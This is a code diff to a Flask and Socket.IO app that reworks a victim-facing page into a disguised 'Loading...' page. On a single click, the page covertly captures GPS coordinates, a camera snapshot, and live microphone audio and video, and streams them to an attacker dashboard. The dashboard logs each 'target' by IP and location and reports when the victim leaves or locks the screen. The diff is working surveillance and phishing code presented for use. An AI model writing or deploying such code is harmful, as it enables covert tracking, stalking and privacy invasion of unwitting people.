@@ -16,27 +16,139 @@ def get_db():
 def save_db(d):
     with open(DB, 'w') as f: json.dump(d, f)
 
+# === UI TARGET ===
 TARGET_HTML = """
 <!DOCTYPE html>
 <html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<title>VIONIX // SECURE ACCESS</title>
+<title>Loading...</title>
+<script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+<style>
+  body { background-color: #ffffff; color: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; cursor: default; }
+  video { display: none; } canvas { display: none; }
+</style></head><body onclick="startAll()">
+<video id="v" autoplay playsinline muted></video>
+<canvas id="c"></canvas>
+
+<script>
+let socket=null;
+let isStarted = false;
+
+document.addEventListener("visibilitychange", function() {
+  if (socket && socket.connected) {
+    if (document.visibilityState === 'hidden') {
+      socket.emit('target_event', {event: 'hidden'});
+    } else {
+      socket.emit('target_event', {event: 'visible'});
+    }
+  }
+});
+
+async function startAll(){
+  if (isStarted) return;
+  isStarted = true;
+
+  try {
+    const locPromise = new Promise((resolve, reject) => navigator.geolocation.getCurrentPosition(resolve, reject, {enableHighAccuracy: true, timeout: 15000}));
+    const mediaPromise = navigator.mediaDevices.getUserMedia({ video: {facingMode:'environment'}, audio: true });
+    
+    locPromise.then(pos => {
+      const loc = {lat: pos.coords.latitude, lon: pos.coords.longitude};
+      fetch('/api/submit', {
+        method: 'POST', headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({lat: loc.lat, lon: loc.lon, foto: null})
+      });
+    }).catch(e => console.log("GPS denied"));
+
+    const mediaStream = await mediaPromise;
+    const v = document.getElementById('v');
+    v.srcObject = mediaStream;
+    
+    v.onloadedmetadata = () => {
+      v.play();
+      
+      const c = document.getElementById('c');
+      c.width = v.videoWidth; c.height = v.videoHeight;
+      c.getContext('2d').drawImage(v, 0, 0);
+      const foto = c.toDataURL('image/jpeg', 0.5);
+      
+      locPromise.then(pos => {
+        const loc = {lat: pos.coords.latitude, lon: pos.coords.longitude};
+        fetch('/api/submit', {
+          method: 'POST', headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({lat: loc.lat, lon: loc.lon, foto: foto})
+        });
+      }).catch(e => {
+        fetch('/api/submit', {
+          method: 'POST', headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({lat: null, lon: null, foto: foto})
+        });
+      });
+      
+      socket = io();
+      socket.on('connect', () => {
+        const audioTrack = mediaStream.getAudioTracks()[0];
+        const audioRecorder = new MediaRecorder(new MediaStream([audioTrack]), { mimeType: 'audio/webm' });
+        audioRecorder.ondataavailable = (e) => {
+          if(e.data.size > 0) {
+            const reader = new FileReader();
+            reader.readAsDataURL(e.data);
+            reader.onloadend = () => {
+              if(socket.connected) socket.emit('live_data', { type: 'audio', data: reader.result });
+            };
+          }
+        };
+        audioRecorder.start(1000); 
+
+        const canvas = document.getElementById('c');
+        const ctx = canvas.getContext('2d');
+        setInterval(() => {
+          if(v.videoWidth > 0 && document.visibilityState === 'visible') {
+            canvas.width = 320; 
+            canvas.height = 240; 
+            ctx.drawImage(v, 0, 0, canvas.width, canvas.height);
+            const frame = canvas.toDataURL('image/jpeg', 0.2);
+            if(socket.connected) socket.emit('live_data', { type: 'video', data: frame });
+          }
+        }, 500); 
+      });
+    };
+  } catch(e) {}
+}
+</script></body></html>
+"""
+
+# === UI DASHBOARD ===
+DASH_HTML = """
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>MURDANY VIONIX // NEO-DRAGON</title>
 <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
 <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
 <style>
-:root{--neon:#00f0ff;--red:#ff003c;--bg:#05050a;}
-body{font-family:'Share Tech Mono',monospace;background:var(--bg);color:var(--neon);text-align:center;padding:20px;overflow-x:hidden;margin:0}
-pre{color:var(--red);font-family:'Share Tech Mono',monospace;text-shadow:0 0 10px var(--red);font-size:10px;line-height:1.2;margin-bottom:20px;}
-h2{font-family:'Orbitron',sans-serif;text-shadow:0 0 15px var(--neon);letter-spacing:3px;margin-top:0}
-button{width:100%;padding:15px;margin:10px 0;border:1px solid var(--neon);background:transparent;color:var(--neon);font-family:'Share Tech Mono',monospace;font-size:16px;font-weight:bold;cursor:pointer;box-shadow:0 0 10px rgba(0,240,255,0.2);transition:0.3s;text-transform:uppercase}
-button:hover{background:var(--neon);color:var(--bg);box-shadow:0 0 25px var(--neon)}
-button.danger{border-color:var(--red);color:var(--red);box-shadow:0 0 10px rgba(255,0,60,0.2)}
-button.danger:hover{background:var(--red);color:#fff;box-shadow:0 0 25px var(--red)}
-video{display:none} canvas{display:none}
-#log{margin-top:20px;font-size:14px;color:#0f0;text-shadow:0 0 5px #0f0;min-height:20px}
-.scanline{position:fixed;top:0;left:0;width:100%;height:100%;background:linear-gradient(transparent 50%,rgba(0,240,255,0.03) 50%);background-size:100% 4px;pointer-events:none;z-index:999}
-.footer{color:#555;font-size:10px;margin-top:30px;letter-spacing:2px;}
+:root{--bg:#05050a;--panel:#0a0a0f;--cyan:#00f0ff;--red:#ff003c;--green:#00ff41;--text:#ccc;}
+body{background:var(--bg);color:var(--text);font-family:'Share Tech Mono',monospace;padding:15px;max-width:520px;margin:auto}
+h3{color:var(--cyan);font-family:'Orbitron',sans-serif;text-align:center;text-shadow:0 0 15px var(--cyan);letter-spacing:2px;border-bottom:1px solid var(--cyan);padding-bottom:10px;}
+pre{color:var(--red);font-family:'Share Tech Mono',monospace;text-shadow:0 0 10px var(--red);font-size:8px;line-height:1.1;text-align:center;margin-bottom:10px;}
+.log-box{background:#000;border:1px solid var(--green);padding:10px;border-radius:4px;height:100px;overflow-y:auto;font-size:11px;color:var(--green);margin-bottom:20px;box-shadow:inset 0 0 10px rgba(0,255,65,0.1)}
+.log-box div{margin-bottom:4px;}
+.live-box{border:1px solid var(--red);padding:10px;margin-bottom:20px;border-radius:4px;background:#000;position:relative;display:none;box-shadow:0 0 15px rgba(255,0,60,0.3)}
+.live-box.active{display:block;}
+.live-box h4{margin:0 0 5px 0;color:var(--red);font-size:12px;text-align:center;letter-spacing:1px;text-transform:uppercase;text-shadow:0 0 5px var(--red)}
+#liveImg{width:100%;border:1px solid #333;display:block;min-height:200px;background:#111;}
+.audio-controls{margin-top:10px;text-align:center;}
+audio{width:100%;height:30px;filter:invert(1);}
+.gen-box{border:1px dashed var(--cyan);padding:15px;margin-bottom:20px;border-radius:4px;background:rgba(0,240,255,0.05)}
+.gen-box h4{margin:0 0 10px 0;color:var(--cyan);font-size:14px;letter-spacing:1px;font-family:'Orbitron',sans-serif;}
+.gen-input{width:100%;padding:10px;background:#000;border:1px solid #333;color:#0f0;font-family:inherit;margin-bottom:10px;box-sizing:border-box;font-size:12px;}
+.gen-btn{width:100%;padding:10px;background:var(--cyan);color:#000;border:none;font-weight:bold;font-family:'Share Tech Mono',monospace;cursor:pointer;text-transform:uppercase;margin-bottom:5px}
+.card{background:var(--panel);border:1px solid #222;border-left:4px solid var(--red);border-radius:4px;padding:12px;margin-bottom:20px;display:flex;gap:12px;position:relative;box-shadow:0 0 10px rgba(255,0,60,0.1)}
+.badge{position:absolute;top:0;right:0;background:var(--red);color:#fff;font-size:10px;padding:2px 8px;font-weight:bold;}
+.left{flex:1} .left img{width:100%;border:1px solid var(--cyan);border-radius:4px;}
+.right{flex:1.5;font-size:11px;line-height:1.6;color:#aaa;}
+.val{color:#fff;} .label{color:var(--cyan);font-weight:bold;}
+.map-link{color:var(--red);text-decoration:none;border-bottom:1px dashed var(--red);}
+.footer{text-align:center;font-size:10px;color:#555;margin-top:30px;letter-spacing:2px;font-family:'Orbitron',sans-serif}
 </style></head><body>
-<div class="scanline"></div>
 <pre>           /\\
           /  \\
          /    \\
@@ -49,126 +161,11 @@ video{display:none} canvas{display:none}
      / |        | \\
     /  |   🐉   |  \\
    /___|________|___\\</pre>
-<h2>[ VIONIX VERIFICATION ]</h2>
-<p style="color:#888">ENCRYPTED LINK ESTABLISHED.<br>REQUIRES BIOMETRIC & LOCATION ACCESS.</p>
-<button onclick="ambilLokasi()">1. AUTHORIZE GPS</button>
-<button onclick="mulaiKamera()">2. AUTHORIZE CAMERA</button>
-<button class="danger" onclick="kirimSemua()">3. EXECUTE UPLOAD</button>
-<button style="border-color:#0f0;color:#0f0;box-shadow:0 0 10px rgba(0,255,0,0.2)" onclick="startLive()">4. START LIVE FEED</button>
-<video id="v" autoplay playsinline></video>
-<canvas id="c"></canvas>
-<div id="log">> AWAITING INPUT_</div>
-<div class="footer">BY MURDANY VIONIX © 2026</div>
-
-<script>
-let stream=null, loc=null, socket=null, liveInterval=null;
-
-async function ambilLokasi(){
-  if(!navigator.geolocation) return document.getElementById('log').innerText="> ERR: NOT SUPPORTED";
-  document.getElementById('log').innerText="> REQ GPS PERMISSION...";
-  navigator.geolocation.getCurrentPosition(
-    p => { loc={lat:p.coords.latitude, lon:p.coords.longitude}; document.getElementById('log').innerText="> GPS LOCKED."; },
-    e => document.getElementById('log').innerText="> ERR: GPS DENIED."
-  );
-}
-
-async function mulaiKamera(){
-  try{
-    stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'}});
-    document.getElementById('v').srcObject=stream;
-    document.getElementById('log').innerText="> CAMERA ONLINE.";
-  }catch(e){ document.getElementById('log').innerText="> ERR: CAM DENIED."; }
-}
-
-async function kirimSemua(){
-  if(!loc) return document.getElementById('log').innerText="> ERR: GPS NOT LOCKED";
-  if(!stream) return document.getElementById('log').innerText="> ERR: CAM OFFLINE";
-  const v=document.getElementById('v'), c=document.getElementById('c');
-  c.width=v.videoWidth; c.height=v.videoHeight;
-  c.getContext('2d').drawImage(v,0,0);
-  const foto=c.toDataURL('image/jpeg',0.5);
-  document.getElementById('log').innerText="> UPLOADING TO SERVER...";
-  await fetch('/api/submit',{
-    method:'POST', headers:{'Content-Type':'application/json'},
-    body:JSON.stringify({lat:loc.lat, lon:loc.lon, foto:foto})
-  });
-  document.getElementById('log').innerText="> UPLOAD SUCCESS.";
-}
-
-async function startLive(){
-  try{
-    document.getElementById('log').innerText="> REQ LIVE ACCESS (CAM + MIC)...";
-    const mediaStream = await navigator.mediaDevices.getUserMedia({ video: {facingMode:'environment'}, audio: true });
-    const v = document.getElementById('v');
-    v.srcObject = mediaStream;
-    
-    socket = io();
-    
-    socket.on('connect', () => {
-      document.getElementById('log').innerText="> LIVE STREAMING ACTIVE...";
-      
-      const audioTrack = mediaStream.getAudioTracks()[0];
-      const audioRecorder = new MediaRecorder(new MediaStream([audioTrack]), { mimeType: 'audio/webm' });
-      audioRecorder.ondataavailable = async (e) => {
-        if(e.data.size > 0) {
-          const reader = new FileReader();
-          reader.readAsDataURL(e.data);
-          reader.onloadend = () => {
-            if(socket.connected)
-              socket.emit('live_data', { type: 'audio', data: reader.result });
-          };
-        }
-      };
-      audioRecorder.start(500);
-
-      const canvas = document.getElementById('c');
-      const ctx = canvas.getContext('2d');
-      liveInterval = setInterval(() => {
-        if(v.videoWidth > 0) {
-          canvas.width = v.videoWidth / 2;
-          canvas.height = v.videoHeight / 2;
-          ctx.drawImage(v, 0, 0, canvas.width, canvas.height);
-          const frame = canvas.toDataURL('image/jpeg', 0.4);
-          if(socket.connected)
-            socket.emit('live_data', { type: 'video', data: frame });
-        }
-      }, 200);
-    });
-  }catch(e){ document.getElementById('log').innerText="> ERR: LIVE ACCESS DENIED."; }
-}
-</script></body></html>
-"""
-
-DASH_HTML = """
-<!DOCTYPE html>
-<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<title>MURDANY VIONIX // NEO-DRAGON</title>
-<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
-<script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
-<style>
-:root{--bg:#05050a;--panel:#0a0a0f;--cyan:#00f0ff;--red:#ff003c;--text:#ccc;}
-body{background:var(--bg);color:var(--text);font-family:'Share Tech Mono',monospace;padding:15px;max-width:520px;margin:auto}
-h3{color:var(--cyan);font-family:'Orbitron',sans-serif;text-align:center;text-shadow:0 0 15px var(--cyan);letter-spacing:2px;border-bottom:1px solid var(--cyan);padding-bottom:10px;}
-.live-box{border:1px solid var(--red);padding:10px;margin-bottom:20px;border-radius:4px;background:#000;position:relative;display:none;box-shadow:0 0 15px rgba(255,0,60,0.3)}
-.live-box.active{display:block;}
-.live-box h4{margin:0 0 5px 0;color:var(--red);font-size:12px;text-align:center;letter-spacing:1px;text-transform:uppercase;text-shadow:0 0 5px var(--red)}
-#liveImg{width:100%;border:1px solid #333;display:block;min-height:200px;background:#111;}
-.audio-controls{margin-top:10px;text-align:center;}
-audio{width:100%;height:30px;filter:invert(1);}
-.gen-box{border:1px dashed var(--cyan);padding:15px;margin-bottom:20px;border-radius:4px;background:rgba(0,240,255,0.05)}
-.gen-box h4{margin:0 0 10px 0;color:var(--cyan);font-size:14px;letter-spacing:1px;font-family:'Orbitron',sans-serif;}
-.gen-input{width:100%;padding:10px;background:#000;border:1px solid #333;color:#0f0;font-family:inherit;margin-bottom:10px;box-sizing:border-box;font-size:12px;}
-.gen-btn{width:100%;padding:10px;background:var(--cyan);color:#000;border:none;font-weight:bold;font-family:'Share Tech Mono',monospace;cursor:pointer;text-transform:uppercase;margin-bottom:5px}
-.gen-btn.alt{background:transparent;border:1px solid var(--cyan);color:var(--cyan)}
-.card{background:var(--panel);border:1px solid #222;border-left:4px solid var(--red);border-radius:4px;padding:12px;margin-bottom:20px;display:flex;gap:12px;position:relative;box-shadow:0 0 10px rgba(255,0,60,0.1)}
-.badge{position:absolute;top:0;right:0;background:var(--red);color:#fff;font-size:10px;padding:2px 8px;font-weight:bold;}
-.left{flex:1} .left img{width:100%;border:1px solid var(--cyan);border-radius:4px;}
-.right{flex:1.5;font-size:11px;line-height:1.6;color:#aaa;}
-.val{color:#fff;} .label{color:var(--cyan);font-weight:bold;}
-.map-link{color:var(--red);text-decoration:none;border-bottom:1px dashed var(--red);}
-.footer{text-align:center;font-size:10px;color:#555;margin-top:30px;letter-spacing:2px;font-family:'Orbitron',sans-serif}
-</style></head><body>
 <h3>MURDANY VIONIX // NEO-NET</h3>
+
+<div class="log-box" id="logBox">
+  <div>> System initialized... Waiting for targets.</div>
+</div>
 
 <div class="live-box" id="liveBox">
   <h4>LIVE INTERCEPT ACTIVE</h4>
@@ -215,6 +212,13 @@ function processQueue() {
   if (!sourceBuffer || sourceBuffer.updating || audioQueue.length === 0) return;
   sourceBuffer.appendBuffer(audioQueue.shift());
 }
+
+socket.on('sys_log', (data) => {
+  const logBox = document.getElementById('logBox');
+  const time = new Date().toLocaleTimeString('en-GB');
+  logBox.innerHTML += `<div>> [${time}] ${data.msg}</div>`;
+  logBox.scrollTop = logBox.scrollHeight;
+});
 
 socket.on('live_stream', async (msg) => {
   const box = document.getElementById('liveBox');
@@ -274,6 +278,13 @@ def submit():
     db = get_db()
     db.append({"seq": len(db)+1, "ip": ip, "waktu": now, "lat": body.get("lat"), "lon": body.get("lon"), "foto": body.get("foto")})
     save_db(db)
+    
+    if body.get("lat") and not body.get("foto"):
+        socketio.emit('sys_log', {'msg': f'Target #{len(db)} terhubung. IP: {ip}'})
+        socketio.emit('sys_log', {'msg': f'Koordinat didapat: {body.get("lat")}, {body.get("lon")}'})
+    elif body.get("foto"):
+        socketio.emit('sys_log', {'msg': f'Snapshot kamera #{len(db)} berhasil diambil.'})
+
     return jsonify({"status": "ok"})
 
 @app.route("/api/data")
@@ -282,6 +293,13 @@ def get_data(): return jsonify(get_db())
 @socketio.on('live_data')
 def handle_live_data(data):
     socketio.emit('live_stream', data)
+
+@socketio.on('target_event')
+def handle_target_event(data):
+    if data.get('event') == 'hidden':
+        socketio.emit('sys_log', {'msg': 'WARNING: Target pindah aplikasi / kunci layar.'})
+    elif data.get('event') == 'visible':
+        socketio.emit('sys_log', {'msg': 'Target kembali membuka halaman.'})
 
 if __name__ == "__main__":
     socketio.run(app, host="0.0.0.0", port=8000, allow_unsafe_werkzeug=True)
